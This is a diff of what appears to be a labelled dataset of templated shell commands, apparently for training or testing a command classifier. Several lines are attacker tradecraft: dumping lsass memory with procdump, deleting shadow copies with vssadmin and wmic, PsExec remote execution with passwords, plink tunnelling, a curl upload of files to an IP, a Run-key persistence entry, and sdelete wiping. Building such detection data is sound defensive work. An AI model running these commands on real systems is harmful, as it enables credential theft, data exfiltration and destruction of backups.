@@ -1,6 +1,16 @@
-1	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\DomainProfile" /v ${value_name} /t REG_DWORD /d ${value}
-1	reg add "HKLM\SOFTWARE\Policies\Microsoft\WindowsFirewall\StandardProfile" /v ${value_name} /t REG_DWORD /d ${value}
-1	reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v ${value_name} /t REG_DWORD /d ${value}
-0	powershell -c "echo ${email_content} | mail -s ${email_subject} ${username}@${domain}"
-0	scp ${source_file_path} ${username}@${ip_address}:${destination_file_path}
-0	powershell -c "wmic.exe shadowcopy delete"
+1	echo ${email_content} | mailx -s ${email_subject} ${username}@${domain}
+1	echo ${email_content} | mailx -s ${email_subject} ${username}@${domain} 2> /dev/null
+1	echo ${email_content} | mailx -s ${email_subject} ${username}@${domain} 2> &1
+1	echo ${email_content} | mailx -s ${email_subject} ${username}@${domain} 2> error.log
+1	cat email.txt | mailx -s ${email_subject} ${username}@${domain}
+1	cat email.txt | mailx -s ${email_subject} ${username}@${domain} 2> /dev/null
+1	cat email.txt | mailx -s ${email_subject} ${username}@${domain} 2> &1
+1	cat email.txt | mailx -s ${email_subject} ${username}@${domain} 2> error.log
+0	powershell -c "plink.exe -ssh -l ${username} -pw ${password} -L 127.0.0.1:${local_port}:${ip_address}:${remote_port} -N"
+0	cmd /c "Psexec64.exe \\${ip_address} -u ${username} -p ${password} -s ${command_to_execute}"
+0	cmd /c "curl -X POST http://${ip_address}/upload -H -F files=@${source_file_path}"
+0	powershell -c "Psexec64 \\${ip_address} -i -u ${username} -p ${password} -c ${command_to_execute} -d"
+0	cmd /c "sdelete.exe -accepteula ${local_file_path}"
+0	vssadmin Delete Shadows /all /Quiet
+0	powershell -c "7z.exe a -slp -p${password} ${destination_file_path} ${source_file_path}"
+0	cmd /c "procdump.exe -mm lsass lsassdump.dmp"
